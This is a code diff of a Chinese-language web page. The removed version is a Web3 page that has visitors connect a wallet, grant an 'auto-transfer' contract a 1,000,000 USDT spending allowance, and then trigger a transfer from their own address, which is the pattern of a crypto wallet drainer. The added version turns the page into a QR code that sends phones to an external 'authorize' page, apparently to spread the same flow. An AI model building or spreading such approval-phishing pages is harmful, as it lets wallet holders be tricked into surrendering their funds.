@@ -2,104 +2,22 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>授权USDT并转账</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <title>生成授权二维码</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            var qrCodeContainer = document.getElementById('qrCodeContainer');
+            qrCodeContainer.innerHTML = '';
+            var qrCode = new QRCode(qrCodeContainer, {
+                text: 'https://wanglei3215.github.io/Mytokenproject/authorize.html', //                text: 'https://wanglei3215.github.io/Mytokenproject/authorize.html', // 授权页面的URL
+                width: 128,
+                height: 128
+            });
+        });
+    </script>
 </head>
 <body>
-<h1>授权USDT并转账</h1>
-<button id="connectWalletBtn">连接钱包</button>
-<button id="approveBtn" style="display: none;">授权</button>
-<button id="transferBtn" style="display: none;">转账</button>
-<div id="result"></div>
-<script>
-    const usdtContractAddress = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj'; // USDT合约地址
-    const autoTransferContractAddress = 'TTzQJWf81VMr9ythn5zgaxviFhouwG3huP'; // 自动转账合约地址
-    const approveAmount = 1000000 * 10 ** 6; // 授权100万USDT
-
-    const usdtAbi = [
-        // USDT ABI
-        {"inputs":[{"name":"name_","type":"string"},{"name":"symbol_","type":"string"}],"stateMutability":"Nonpayable","type":"Constructor"},
-        {"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"Approval","type":"Event"},
-        {"inputs":[{"name":"userAddress","type":"address"},{"name":"relayerAddress","type":"address"},{"name":"functionSignature","type":"bytes"}],"name":"MetaTransactionExecuted","type":"Event"},
-        {"inputs":[{"indexed":true,"name":"previousOwner","type":"address"},{"indexed":true,"name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"Event"},
-        {"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"Transfer","type":"Event"},
-        {"outputs":[{"type":"string"}],"name":"ERC712_VERSION","stateMutability":"View","type":"Function"},
-        {"outputs":[{"type":"uint256"}],"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","stateMutability":"View","type":"Function"},
-        {"outputs":[{"type":"bool"}],"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","stateMutability":"Nonpayable","type":"Function"},
-        {"outputs":[{"type":"uint256"}],"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","stateMutability":"View","type":"Function"},
-        {"outputs":[{"type":"uint8"}],"name":"decimals","stateMutability":"View","type":"Function"},
-        {"outputs":[{"type":"bool"}],"inputs":[{"name":"spender","type":"address"},{"name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","stateMutability":"Nonpayable","type":"Function"},
-        {"outputs":[{"type":"bytes"}],"inputs":[{"name":"userAddress","type":"address"},{"name":"functionSignature","type":"bytes"},{"name":"sigR","type":"bytes32"},{"name":"sigS","type":"bytes32"},{"name":"sigV","type":"uint8"}],"name":"executeMetaTransaction","stateMutability":"Payable","type":"Function"},
-        {"outputs":[{"type":"uint256"}],"name":"getChainId","stateMutability":"View","type":"Function"},
-        {"outputs":[{"type":"uint256"}],"name":"getDomainSeperator","stateMutability":"View","type":"Function"},
-        {"outputs":[{"type":"bytes32"}],"inputs":[{"name":"userAddress","type":"address"},{"name":"functionSignature","type":"bytes"},{"name":"sigR","type":"bytes32"},{"name":"sigS","type":"bytes32"},{"name":"sigV","type":"uint8"}],"name":"getMessageHash","stateMutability":"View","type":"Function"},
-        {"outputs":[{"type":"uint256"}],"name":"getNonce","stateMutability":"View","type":"Function"},
-        {"outputs":[{"type":"string"}],"name":"name","stateMutability":"View","type":"Function"},
-        {"outputs":[{"type":"bool"}],"inputs":[{"name":"spender","type":"address"},{"name":"addedValue","type":"uint256"}],"name":"increaseAllowance","stateMutability":"Nonpayable","type":"Function"},
-        {"outputs":[{"type":"string"}],"name":"symbol","stateMutability":"View","type":"Function"},
-        {"outputs":[{"type":"uint256"}],"inputs":[{"name":"userAddress","type":"address"}],"name":"getNonce","stateMutability":"View","type":"Function"}
-    ];
-
-    const autoTransferAbi = [
-        {"inputs":[{"internalType":"address","name":"_usdtToken","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
-        {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},
-        {"inputs":[{"internalType":"address","name":"userWallet","type":"address"}],"name":"checkAndTransfer","outputs":[],"stateMutability":"nonpayable","type":"function"},
-        {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
-        {"inputs":[{"internalType":"uint256","name":"newThreshold","type":"uint256"}],"name":"setThreshold","outputs":[],"stateMutability":"nonpayable","type":"function"},
-        {"inputs":[],"name":"threshold","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-        {"inputs":[],"name":"usdtToken","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}
-    ];
-
-    let web3;
-
-    async function connectWallet() {
-        if (typeof window.ethereum !== 'undefined') {
-            web3 = new Web3(window.ethereum);
-            try {
-                await window.ethereum.request({ method: 'eth_requestAccounts' });
-                document.getElementById('connectWalletBtn').style.display = 'none';
-                document.getElementById('approveBtn').style.display = 'block';
-            } catch (error) {
-                console.error(error);
-                alert('连接钱包失败!');
-            }
-        } else {
-            alert('请安装欧易钱包插件!');
-        }
-    }
-
-    document.getElementById('connectWalletBtn').addEventListener('click', connectWallet);
-
-    document.getElementById('approveBtn').addEventListener('click', async () => {
-        const accounts = await web3.eth.getAccounts();
-        const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
-        usdtContract.methods.approve(autoTransferContractAddress, approveAmount).send({
-            from: accounts[0],
-            gas: 200000
-        }).then(() => {
-            document.getElementById('result').innerText = '授权成功';
-            document.getElementById('approveBtn').style.display = 'none';
-            document.getElementById('transferBtn').style.display = 'block';
-        }).catch((error) => {
-            console.error(error);
-            document.getElementById('result').innerText = '授权失败';
-        });
-    });
-
-    document.getElementById('transferBtn').addEventListener('click', async () => {
-        const accounts = await web3.eth.getAccounts();
-        const contract = new web3.eth.Contract(autoTransferAbi, autoTransferContractAddress);
-        await contract.methods.checkAndTransfer(accounts[0]).send({
-            from: accounts[0],
-            gas: 200000
-        }).then(() => {
-            document.getElementById('result').innerText = '转账成功';
-        }).catch((error) => {
-            console.error(error);
-            document.getElementById('result').innerText = '转账失败';
-        });
-    });
-</script>
+<h1>生成授权二维码</h1>
+<div id="qrCodeContainer"></div>
 </body>
 </html>
